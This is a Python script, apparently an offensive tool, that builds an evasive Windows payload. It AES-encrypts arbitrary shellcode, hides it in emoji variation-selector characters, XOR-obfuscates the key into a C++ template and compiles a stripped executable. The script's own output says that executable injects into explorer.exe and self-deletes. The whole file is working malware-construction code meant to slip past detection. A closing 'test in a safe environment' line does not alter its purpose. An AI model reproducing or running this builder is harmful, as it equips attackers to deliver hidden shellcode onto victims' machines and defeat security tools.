#!/usr/bin/env python3
"""
Emoji-Obfuscated Payload Builder
Encrypts shellcode with AES-256, encodes to emoji, and compiles to executable
"""

import argparse
import subprocess
import os
import sys
import secrets
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib

def generate_key():
    """Generate a random 256-bit AES key"""
    return secrets.token_bytes(32)

def encrypt_shellcode(shellcode_data, key):
    """Encrypt shellcode using AES-256 CBC mode"""
    key_hash = hashlib.sha256(key).digest()
    iv = secrets.token_bytes(16)
    cipher = AES.new(key_hash, AES.MODE_CBC, iv)
    padded_data = pad(shellcode_data, AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    return iv + encrypted  # Prepend IV to encrypted data

def encode_to_emoji(data, base_emoji='😈'):
    """Encode binary data into emoji using Unicode variation selectors"""
    emoji_string = base_emoji
    for byte in data:
        high_nibble = (byte >> 4) & 0x0F
        low_nibble = byte & 0x0F
        high_selector = chr(0xFE00 + high_nibble)
        low_selector = chr(0xFE00 + low_nibble)
        emoji_string += high_selector + low_selector
    return emoji_string

def obfuscate_key_for_cpp(key):
    """Split the key into 4 chunks and XOR-encode each chunk for C++ code.

    Mirrors KeyDerivation::DeriveKey() in simple_emoji_injector.cpp:
    chunk i is XOR-encoded with xkey(i) = 0xA5 + i*0x11 (see C++ side).
    """
    chunk_size = 8
    chunks = [key[i:i+chunk_size] for i in range(0, len(key), chunk_size)]
    cpp_arrays = []
    for i, chunk in enumerate(chunks):
        xkey = (0xA5 + i * 0x11) & 0xFF
        hex_values = ', '.join([f'0x{b ^ xkey:02X}' for b in chunk])
        cpp_arrays.append(f"const BYTE k{i+1}[] = {{{hex_values}}};")
    return '\n        '.join(cpp_arrays)

def inject_payload_into_template(template_path, emoji_payload, key):
    """Inject emoji payload and key into C++ template"""
    try:
        with open(template_path, 'r', encoding='utf-8') as f:
            template_code = f.read()
    except FileNotFoundError:
        print(f"[!] Error: Template file not found: '{template_path}'", file=sys.stderr)
        sys.exit(1)

    # Replace emoji payload
    emoji_placeholder = 'L"EMOJI_PAYLOAD_PLACEHOLDER"'
    if emoji_placeholder not in template_code:
        print(f"[!] Error: Emoji placeholder not found in template.", file=sys.stderr)
        sys.exit(1)
    
    emoji_escaped = emoji_payload.replace('\\', '\\\\').replace('"', '\\"')
    template_code = template_code.replace(emoji_placeholder, f'L"{emoji_escaped}"')
    
    # Replace key components
    old_keys = """const BYTE k1[] = {0x4A, 0x8F, 0x23, 0xC7, 0x91, 0x5E, 0xD2, 0x6B};
        const BYTE k2[] = {0x7C, 0x3A, 0xE9, 0x15, 0x8D, 0x47, 0xB6, 0x2F};
        const BYTE k3[] = {0xA1, 0x5C, 0xF8, 0x34, 0xD9, 0x72, 0xBE, 0x60};
        const BYTE k4[] = {0x93, 0x2D, 0xC5, 0x78, 0xE4, 0x19, 0xAF, 0x51};"""
    
    if old_keys not in template_code:
        print("[!] Error: Key placeholder block (k1-k4) not found in template.", file=sys.stderr)
        sys.exit(1)
    
    obfuscated_keys = obfuscate_key_for_cpp(key)
    template_code = template_code.replace(old_keys, obfuscated_keys)
    
    return template_code

def compile_payload(cpp_code, output_exe, use_wsl=False):
    """Compile the C++ code into an executable"""
    temp_cpp_filename = "emoji_final.cpp"
    
    print(f"[*] Writing C++ code to '{temp_cpp_filename}'...")
    with open(temp_cpp_filename, 'w', encoding='utf-8') as f:
        f.write(cpp_code)
    
    print(f"[*] Compiling into '{output_exe}'...")
    
    if use_wsl:
        # Use WSL for compilation
        compile_command = [
            "wsl",
            "x86_64-w64-mingw32-g++",
            "-o", output_exe,
            temp_cpp_filename,
            "-ladvapi32",
            "-s",
            "-O2",
            "-static"
        ]
    else:
        # Use native compiler
        compiler = "x86_64-w64-mingw32-g++" if sys.platform != 'win32' else "g++"
        compile_command = [
            compiler,
            "-o", output_exe,
            temp_cpp_filename,
            "-ladvapi32",
            "-s",
            "-O2",
            "-static"
        ]

    try:
        result = subprocess.run(compile_command, check=True, capture_output=True, text=True)
        print(f"[+] Compilation successful!")
        print(f"[+] Emoji-obfuscated payload created: '{output_exe}'")
        
        if result.stderr:
            print("\nCompiler warnings:\n", result.stderr)

    except subprocess.CalledProcessError as e:
        print("[!] Compilation failed!", file=sys.stderr)
        if e.stdout:
            print("Output:\n", e.stdout, file=sys.stderr)
        if e.stderr:
            print("Errors:\n", e.stderr, file=sys.stderr)
        sys.exit(1)
    except FileNotFoundError:
        print(f"[!] Error: Compiler not found.", file=sys.stderr)
        print("    Try using --wsl flag if on Windows", file=sys.stderr)
        sys.exit(1)
    finally:
        if os.path.exists(temp_cpp_filename):
            print(f"[*] Cleaning up '{temp_cpp_filename}'...")
            os.remove(temp_cpp_filename)

def main():
    parser = argparse.ArgumentParser(
        description="Build emoji-obfuscated self-deleting payload",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-b", "--bin", required=True, help="Shellcode .bin file")
    parser.add_argument("-t", "--template", required=True, help="C++ template file (simple_emoji_injector.cpp)")
    parser.add_argument("-o", "--output", required=True, help="Output .exe name")
    parser.add_argument("-e", "--emoji", default="😈", help="Base emoji (default: 😈)")
    parser.add_argument("--wsl", action="store_true", help="Use WSL for compilation on Windows")
    parser.add_argument("--no-compile", action="store_true", help="Generate C++ only, don't compile")

    args = parser.parse_args()

    print("=" * 70)
    print("  EMOJI-OBFUSCATED PAYLOAD BUILDER")
    print("=" * 70)
    
    # Read shellcode
    try:
        with open(args.bin, 'rb') as f:
            shellcode_data = f.read()
    except FileNotFoundError:
        print(f"[!] Error: Shellcode file not found: '{args.bin}'", file=sys.stderr)
        sys.exit(1)
    
    print(f"\n[*] Read {len(shellcode_data)} bytes of shellcode")
    
    # Generate key
    print("[*] Generating 256-bit AES key...")
    key = generate_key()
    print(f"[+] Key: {key.hex()}")
    
    # Encrypt
    print("[*] Encrypting shellcode with AES-256-CBC...")
    encrypted_data = encrypt_shellcode(shellcode_data, key)
    print(f"[+] Encrypted: {len(encrypted_data)} bytes (includes 16-byte IV)")
    
    # Encode to emoji
    print("[*] Encoding to emoji using Unicode variation selectors...")
    emoji_payload = encode_to_emoji(encrypted_data, args.emoji)
    print(f"[+] Emoji payload: {len(emoji_payload)} characters")
    print(f"[*] Preview: {emoji_payload[:60]}...")
    
    # Inject into template
    print("\n[*] Injecting payload into C++ template...")
    final_code = inject_payload_into_template(args.template, emoji_payload, key)
    
    if args.no_compile:
        output_cpp = args.output.replace('.exe', '.cpp')
        with open(output_cpp, 'w', encoding='utf-8') as f:
            f.write(final_code)
        print(f"[+] Generated C++ file: {output_cpp}")
        print(f"\n[*] To compile manually:")
        print(f"    x86_64-w64-mingw32-g++ -o {args.output} {output_cpp} -ladvapi32 -s -O2 -static")
    else:
        # Compile
        compile_payload(final_code, args.output, args.wsl)
    
    print("\n" + "=" * 70)
    print("  DONE!")
    print("=" * 70)
    print(f"\n[✓] Payload features:")
    print(f"    • Shellcode encrypted with AES-256-CBC")
    print(f"    • Hidden in {len(emoji_payload)} emoji characters")
    print(f"    • Injects into explorer.exe")
    print(f"    • Self-deletes after execution")
    print(f"\n[!] Test in a safe environment!\n")

if __name__ == "__main__":
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("[!] Error: pycryptodome not installed.", file=sys.stderr)
        print("    Install: pip install pycryptodome", file=sys.stderr)
        sys.exit(1)
    
    main()
